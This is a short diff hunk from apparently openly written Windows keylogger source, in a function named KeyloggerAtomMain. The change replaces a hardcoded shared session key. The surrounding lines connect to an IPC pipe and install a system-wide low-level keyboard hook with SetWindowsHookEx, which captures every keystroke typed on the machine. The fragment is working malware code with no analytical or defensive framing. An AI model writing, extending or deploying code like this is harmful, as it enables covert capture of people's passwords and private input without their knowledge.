@@ -123,7 +123,7 @@ DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
     
-    BYTE SharedSessionKey[] = "bgKnKFK7SLK4hbdQ";
+    BYTE SharedSessionKey[] = "780t93RsjAyjYlNm";
 
     /* Set the system-wide hook. Requires user32.dll */
     s_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
